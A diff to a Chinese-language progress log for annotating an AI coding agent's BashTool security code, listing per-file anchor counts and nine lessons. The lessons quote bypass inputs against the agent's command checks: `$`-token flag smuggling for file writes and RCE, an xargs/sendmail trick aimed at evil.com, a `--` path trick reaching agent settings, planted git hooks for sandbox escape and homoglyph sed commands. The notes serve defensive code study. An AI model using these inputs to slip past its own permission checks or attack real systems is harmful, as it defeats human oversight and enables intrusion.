@@ -1007,19 +1007,55 @@ MCP 这条线可以按四段读：`config.ts`（允不允许连）→ `client.ts
 
 流程账：预检三断言一次通过、零合并错误（硬规矩连续第 9 批生效）；一处 FAIL——`gitOperationTracking.ts` 文件级批注锚在第 4 行，那是 9 行文档块注释的中部续行（spawnMultiAgent 的块正好 4 行收尾所以那边自动外移成功，两边块长不同），中文被塞进块内，挪到 `*/` 行后过验；spawnMultiAgent 一处提示（before 落在块注释结尾行、自动前移到块前）为人眼确认通顺。
 
+### BashTool 下半：安全核心与渲染（`BashTool/` 18/18 全清，tools 到 167/184）
+
+15 个文件 5,917 行 → 批注版 6,187 行、340 处锚点。目录全清意味着 `src/tools/` 只剩 AgentTool 一个目录（17 份 / 4,889 行）。
+
+| 文件 | 原文行 | 锚点 | 看点 |
+| --- | --- | --- | --- |
+| [`readOnlyValidation.ts`](annotated/src/tools/BashTool/readOnlyValidation.ts) | 1,990 | 82 | 只读判定的两条腿：allowlist 旗标表 + 整命令正则 |
+| [`pathValidation.ts`](annotated/src/tools/BashTool/pathValidation.ts) | 1,303 | 49 | 38 条命令的路径提取规则 + `--` 处理 + 剥壳同步三处 |
+| [`sedValidation.ts`](annotated/src/tools/BashTool/sedValidation.ts) | 684 | 51 | 白名单（p/Np/N,Mp + s///）+ denylist 双层，同形字攻击 |
+| [`prompt.ts`](annotated/src/tools/BashTool/prompt.ts) | 369 | 29 | Bash 工具的完整系统提示：git 安全协议、沙箱段、工具偏好 |
+| [`sedEditParser.ts`](annotated/src/tools/BashTool/sedEditParser.ts) | 322 | 20 | sed -i 编辑的结构化解析 + BRE→ERE 转换 |
+| [`bashCommandHelpers.ts`](annotated/src/tools/BashTool/bashCommandHelpers.ts) | 265 | 16 | 管道分段权限聚合 + 跨段 cd+git 检测 |
+| [`utils.ts`](annotated/src/tools/BashTool/utils.ts) | 223 | 10 | 输出截断、data URI 图片、cwd 重置 |
+| [`BashToolResultMessage.tsx`](annotated/src/tools/BashTool/BashToolResultMessage.tsx) | 191 | 13 | 结果渲染（React Compiler 产物） |
+| [`UI.tsx`](annotated/src/tools/BashTool/UI.tsx) | 185 | 17 | 工具调用渲染：sed 只显路径、注释标签、截断两道线 |
+| [`shouldUseSandbox.ts`](annotated/src/tools/BashTool/shouldUseSandbox.ts) | 153 | 14 | excludedCommands 是便利功能不是安全边界 |
+| [`commandSemantics.ts`](annotated/src/tools/BashTool/commandSemantics.ts) | 140 | 12 | 退出码语义表：grep 1 = 没匹配不是错误 |
+| [`modeValidation.ts`](annotated/src/tools/BashTool/modeValidation.ts) | 115 | 8 | acceptEdits 放行七个文件命令 |
+| [`destructiveCommandWarning.ts`](annotated/src/tools/BashTool/destructiveCommandWarning.ts) | 102 | 14 | 破坏性命令警告表（纯展示） |
+| [`commentLabel.ts`](annotated/src/tools/BashTool/commentLabel.ts) | 13 | 4 | 首行注释当 UI 标签 |
+| [`toolName.ts`](annotated/src/tools/BashTool/toolName.ts) | 2 | 1 | 两行文件打破循环依赖 |
+
+九个值得记的点：
+
+1. **allowlist 与正则的两条腿**。`isCommandReadOnly` 先试 `isCommandSafeViaFlagParsing`（COMMAND_ALLOWLIST 逐命令旗标表），再退到 READONLY_COMMAND_REGEXES（整命令正则）。注释明说优先 allowlist——git 允许 `--upload-pack=cmd` 缩写成 `--up=cmd`，正则防不住缩写。
+2. **`$` 全 token 禁绝**。shell-quote 把 `$VAR` 保留成字面 token 但 bash 运行时展开它，这一个 parser differential 同时打穿 validateFlags 和 callback：`git diff "$Z--output=/tmp/pwned"` 写任意文件、`rg . "$Z--pre=bash"` 一步 RCE、`ps ax"$Z"e` 让 BSD-e 检测正则失明。花括号展开混淆（`{` + `,`/`..`）同理要拦。
+3. **xargs 的 `-i`/`-e` 是 vulnerability archaeology 标本**。GNU getopt 可选附加参数（`i::`/`e::`）让校验器和 xargs 对「吃几个参数」的认知相反：`xargs -it tail a@evil.com` 校验器看 -it 合法，GNU 把 t 当 replace-str、tail 才是目标命令，于是 /usr/sbin/sendmail 被拼出来发信。改用强制参数的大写 -I {} / -E EOF。
+4. **fd 的 `-l` 也要禁**。它内部起 `ls` 子进程——PATH 里放个恶意 ls 就接管。**一个旗标「只是显示信息」不代表安全，得看它内部还调了什么。**
+5. **git 沙箱逃逸的四道闸**：cd+git 组合（恶意目录放假 hooks）、当前目录像 bare repo、命令里同时创建 git 内部文件并跑 git（mkdir hooks && echo x > hooks/pre-commit && git status）、竞态窗口（sleep 10 && git status 在 bare-repo 检查时文件还不存在，所以沙箱开着且 cwd 非原目录就转人工）。
+6. **`--` 处理是路径校验的命门**。`rm -- -/../.claude/settings.local.json` 以 - 开头，朴素 !startsWith('-') 过滤把它当旗标丢掉，校验看到零路径直接放行。filterOutFlags/parsePatternCommand/sed/jq/git diff --no-index 五处都补了 `--` 跟踪。
+7. **剥壳三处必须同步**（本文件 argv 版 / bashPermissions 文本版 / checkSemantics）。bashPermissions 里那份窄版是死代码但不能删——那个模块卡在 Bun feature() DCE 复杂度阈值上，删 80 行会让 feature('BASH_CLASSIFIER') 静默失效（PR #21503 round 3 实测 30/30 → 22/30）。不同步 = 语义检查剥了壳、路径校验看到壳 → passthrough → 包装里的命令从未被校验。stdbuf/env 就是这么漏过又补上的。
+8. **sed 双层校验**。白名单严到「命令字母级」：isPrintCommand 一条正则只认 p/Np/N,Mp，w/W/e/E 连出现资格都没有；denylist 连全角 ｗ、小型大写 ᴡ、组合字符 w̃ 这些同形字都拒（人眼看是 w，字节层面不是）。
+9. **退出码语义表治「假红」**。grep 1 = 没匹配、diff 1 = 有差异、test 1 = 条件为假——把这些一律当失败的 UI 会满屏误报。函数注释自己承认启发式提取基名 May get it super wrong - don't depend on this for security。
+
+流程账：预检三断言一次通过、零合并错误（硬规矩连续第 10 批生效）；三处 FAIL——readOnlyValidation 数据文件里误置了两条 pathValidation 的锚点（1220/1263，写串了文件）+ 一条锚在 9 行文档块中部（1583），pathValidation 的 (27,'after') 劈开多行 type 声明，prompt.ts 的 (228,'after') 劈开多行三元赋值；全部修正后复验全过。
+
 ### 服务层之后读什么（按「对理解主链路的价值 / 体量」排）
 
-`services/` 已清零，`src/tools/` 已做 153/184。`src/` 还剩 1,448 份。候选目标（数字来自 `python scripts/check-coverage.py src`）：
+`services/` 已清零，`src/tools/` 已做 167/184。`src/` 还剩 1,435 份。候选目标（数字来自 `python scripts/check-coverage.py src`）：
 
 | 目录 | 规模 | 为什么是下一步 |
 | --- | --- | --- |
-| `src/tools/` | 184 份 / 50,863 行（**已做 153 / 79% 行数**） | 工具的实际实现。服务层只讲「怎么发请求」，工具层讲「一次工具调用具体干什么」，是主链路的另一半。只剩 BashTool（14 份 / 5,917 行）和 AgentTool（17 份 / 4,889 行）两个大目录 |
+| `src/tools/` | 184 份 / 50,863 行（**已做 167 / 90% 行数**） | 工具的实际实现。服务层只讲「怎么发请求」，工具层讲「一次工具调用具体干什么」，是主链路的另一半。只剩 AgentTool（17 份 / 4,889 行，含 runAgent 973 / UI 872 / loadAgentsDir 755 / agentToolUtils 686 / built-in 五个子代理） |
 | `src/hooks/` | 104 份 / 19,232 行 | 生命周期钩子（PreToolUse / PostSampling 等），前面几个模块反复引用，读完能把 fork 时机的谜团全部收口 |
 | `src/utils/` | 564 份 / 180,487 行（0 已做） | 最大的一块，但最杂。适合按需读（遇到哪个函数再查），不适合线性通读 |
 | `src/components/` | 389 份 / 81,892 行（已做 66） | TUI 组件。已经做了一部分，剩下的是各面板 |
 
 > 这里的进度是脚本算的（`python scripts/check-coverage.py <目录>`）。
-> **`services/` 清零 ≠ 全仓完成**——全仓还有 1,448 份没动（26% 行数）。
+> **`services/` 清零 ≠ 全仓完成**——全仓还有 1,435 份没动（27% 行数）。
 
 ---
 
